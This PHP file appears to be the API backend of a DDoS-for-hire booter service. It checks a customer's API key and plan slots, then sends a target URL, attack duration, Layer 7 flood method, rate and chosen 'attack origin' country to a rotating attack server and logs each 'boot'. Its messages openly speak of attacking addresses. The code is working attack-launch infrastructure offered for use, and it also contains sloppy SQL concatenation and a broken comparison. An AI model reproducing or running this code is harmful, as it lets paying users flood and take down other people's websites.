<?php 

include 'includes/configuration.php'; 

$getIp = file_get_contents("https://api.ipify.org");
$user = $_GET['user'];
$api_key = $_GET['api_key'];
$address = $_GET['address'];
$time = intval($_GET['duration']);
$method = $_GET['type7'];
$mode = $_GET['mode'];
$rate = $_GET['rate'];
$origin = $_GET['origin'];
$host = $_GET['host'];
if ($mode == 'GET')
{$post = '0';
}else{
$post = $_GET['post'];} 


$SQLCheck = $odb -> prepare("SELECT COUNT(*) FROM `apiplus` WHERE `apikey` = :key AND `user` = :user");
$SQLCheck -> execute(array(':key' => $api_key, ':user' => $user));
$countClef = $SQLCheck -> fetchColumn(0);
if ($countClef == 0)
{
echo'Your Key or your User ID is invalid .';
exit();
} else {

$SQLGetInfo = $odb -> prepare("SELECT * FROM `users` WHERE `ID` = :id");
$SQLGetInfo -> execute(array(':id' => $user));
$userInf = $SQLGetInfo -> fetch(PDO::FETCH_ASSOC);

$utilisateur = $userInf['username'];
$IDacc = $userInf['ID'];
$concu = $userInf['concu'];

$SQLGetIn = $odb -> prepare('SELECT * FROM `apiplus` WHERE `apikey` = :key');
$SQLGetIn -> execute(array(':key' => $api_key));
$userIn = $SQLGetIn -> fetch(PDO::FETCH_ASSOC);

$userIP = $userIn['ip'];
$usertimeapi = $userIn['timeapi'];







} 

                    $SQLGetInfo = $odb -> prepare("SELECT `classement` FROM `methodes` WHERE `method` = :method");
                    $SQLGetInfo -> execute(array(':method' => htmlspecialchars($method)));
                    $type = $SQLGetInfo -> fetchColumn(0);
                    $serveurs = array();
                    $serveur = "*";
                    $ServeursRotation = $odb -> query("SELECT * FROM `serveurs` WHERE `type` = $type AND `status` = 0 ORDER BY ABS(`date`) ASC LIMIT 1;");
                    if ($ServeursRotation -> rowCount() != 0) {
                    $serveurs = $ServeursRotation -> fetchAll(PDO::FETCH_ASSOC);
                    $id = $serveurs[0]['ID'];
                    $adresse = $serveurs[0]['adresse'];
                   
if (empty($address) || empty($time) || empty($method))
                    {
                        echo 'Please verify all fields. Try: start?user=IDuser&api_key=key&host=1.1.1.1&port80=&time=30&method=method';

if (isset($rate)) {
       if ($rate > 64)
 {
                    echo 'Please enter a value inferior than 65 requests.'; 

                    }}}
                    else{
                    if ($time < 15)
                    {
                    echo 'Please enter a value greater than 15 seconds minimum.'; 
                    }
                    else{
    $allowedmode = array('POST', 'GET');
    if (!in_array($mode, $allowedmode))
    {
    echo'Please choose a correct Request Method.';
                        }
                        else{
    $allowedorigin = array('Worldwide', 'United_states', 'Germany', 'Brazil', 'Thailand', 'Vietnam', 'China', 'Hong_Kong', 'Korea', 'Japan', 'Italy', 'Netherland', 'Poland',);
    if (!in_array($origin, $allowedorigin))
    {
    echo'Please choose a correct Attack Origin.';
                        }
                        else{

                    $SQLGetInfo = $odb -> prepare("SELECT `classement` FROM `methodes` WHERE `method` = :method");
                    $SQLGetInfo -> execute(array(':method' => htmlspecialchars($method)));
                    $type = $SQLGetInfo -> fetchColumn(0);
                    if ($type !== '7') 
                    {
                    echo 'Your method is not a required method to attack in Layer 7.';
                    }
                    else
                    {
                    $checkRunningSQL = $odb -> prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username AND `time` + `date` > UNIX_TIMESTAMP()");
                    $checkRunningSQL -> execute(array(':username' => $utilisateur));
                    $countRunning = $checkRunningSQL -> fetchColumn(0);
                    $SQLGetTime = $odb -> prepare("SELECT `plans`.`nbr` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`ID` = :id");
                    $SQLGetTime -> execute(array(':id' => $IDacc));
                    $concur = $SQLGetTime -> fetchColumn(0);
                    if ($countRunning > $concur +$concu)
                    {
                    echo 'It seems that your API has run out of slots, please wait!.';
                    }
                    else
                    {
          if ($time < 30)
          {
          echo 'The minimum accepted time is 30 seconds.'; 
          }
                    else
                    {
                    if (!filter_var($address, FILTER_VALIDATE_URL))
                        {
                            echo 'The request could not succeed, please insert an URL Website.';    
                    } 
                    else
                    {
                    $SQLCheckBlacklist = $odb -> prepare("SELECT COUNT(*) FROM `blacklist` WHERE `IP` = :host");
                    $SQLCheckBlacklist -> execute(array(':host' => $address));
                    $countBlacklist = $SQLCheckBlacklist -> fetchColumn(0);
                    if ($countBlacklist > 0)
          {
          echo 'The request could not be successful, this address cannot be attacked from our servers.';
          }
          else
          {
    $allowedmode = array('POST', 'GET');
    if (!in_array($mode, $allowedmode))
    {
    echo'Please choose a correct Request Method.';
                        }
                        else{
    $allowedorigin = array('Worldwide', 'United_states', 'Germany', 'Brazil', 'Thailand', 'Vietnam', 'China', 'Hong_Kong', 'Korea', 'Japan', 'Italy', 'Netherland', 'Poland',);
    if (!in_array($origin, $allowedorigin))
    {
    echo'Please choose a correct Attack Origin.';
                        }
                        else{
                    if ($time > $usertimeapi) {
                    echo 'You have exceeded the time allowed by this API.';
                    }
          else
          {  
                    $ServeurCompatible = $odb -> prepare("SELECT COUNT(*) FROM `methodes` WHERE `method` = :nom");
                    $ServeurCompatible -> execute(array(':nom' => $method));
                    $Verification = $ServeurCompatible -> fetchColumn(0);
                    if ($Verification == 0){
                    echo'It was not possible to start your shipment, please make sure that the selected attack method is available.';    
                    }
                    else
                    {



                              $serveurs = array();
                    $serveur = "*";
                    $ServeursRotation = $odb -> query("SELECT * FROM `serveurs` WHERE `type` = $type AND `status` = 0 ORDER BY ABS(`date`) ASC LIMIT 1;");
                    if ($ServeursRotation -> rowCount() != 0) {
                    $serveurs = $ServeursRotation -> fetchAll(PDO::FETCH_ASSOC);
                    $id = $serveurs[0]['ID'];
                    $adresse = $serveurs[0]['adresse'];
                    
                                $checkServeurSQL = $odb -> prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username AND `serveur` = :serveur AND `time` + `date` > UNIX_TIMESTAMP()");
                                $checkServeurSQL -> execute(array(':username' => $utilisateur, ':serveur' => $serveur));
                                $countServeur= $checkServeurSQL -> fetchColumn(0);
                                if ($countServeur = 0)
                                {
                    echo 'There are no servers available to handle your attack, try later.';
                    }
          else
          {
                                    $SQL = $odb->prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username AND `time` + `date` > UNIX_TIMESTAMP()");
            $SQL -> execute(array(':username' => $utilisateur));
            $countRunning = $SQL -> fetchColumn(0);
            if ($countRunning >= 1) {
                
                echo 'You have too many boots running.';
               }
          else
          {
$serve = $odb -> prepare('SELECT * FROM `serveurs` WHERE `ID` = :serveur');
$serve -> execute(array(':serveur' => $id));
$servet = $serve -> fetch(PDO::FETCH_ASSOC);
                        $SQL = $odb->prepare("SELECT COUNT(*) FROM `logs` WHERE `serveur` = :id AND `time` + `date` > UNIX_TIMESTAMP() AND `time` != 0");
                        $SQL -> execute(array(':id' => $id));
$concurr = $SQL -> fetchColumn(0);
if ($concurr >= $servet['concurrents']) {
                
                echo 'No server is available or online at the moment, please renew your request within minutes.';
               }
                    else
                    {

                                        ini_set('default_socket_timeout', 1);
                                        $adresse = str_replace("%hote%", $address, $adresse);                                  
                                        $adresse = str_replace("%temps%", $time, $adresse);
                                        $adresse = str_replace("%type%", $method, $adresse);
                                        $adresse = str_replace("%mode%", $mode, $adresse);
                                        $adresse = str_replace("%rate%", $rate, $adresse);
                                        $adresse = str_replace("%host%", $host, $adresse);   
                                        $adresse = str_replace("%origin%", $origin, $adresse);
                                        $adresse = str_replace("%post%", $post, $adresse);                                   
                                        $adresse = str_replace("%user%", $utilisateur, $adresse);
                                        APIinit($adresse, $odb);                                       
                                        $insertLogSQL = $odb -> prepare("INSERT INTO `logs` VALUES(NULL, :user, :ip, :port, :time, :timerst, :method, :serveur, :note, '', UNIX_TIMESTAMP())");
                                        $insertLogSQL -> execute(array(':user' => $utilisateur, ':ip' => $address, ':port' => '0', ':time' => $time, ':timerst' => $time, ':method' => $method, ':serveur' => $id, ':note' => "layer 7 info mode=$mode&rate=$rate&host=$host&origin=$origin&post=$post"));
                                        
                                        $updateServeur = $odb -> prepare("UPDATE `serveurs` SET `date` = UNIX_TIMESTAMP(NOW()) WHERE `ID` = :id");
                                        $updateServeur -> execute(array(':id' => $id));

                                        $insertAPISQL = $odb -> prepare("INSERT INTO `api_historique` VALUES(NULL, :clef, :username, :value, :type, :ip, UNIX_TIMESTAMP())");
                                        $insertAPISQL -> execute(array(':clef' => $api_key, ':username' => $utilisateur, ':value' => $method, ':type' => 'L7', ':ip' => $address));
                                        echo 'Success';
exit();

                }}}}}}}}}}}}}}}}}}
                                ?>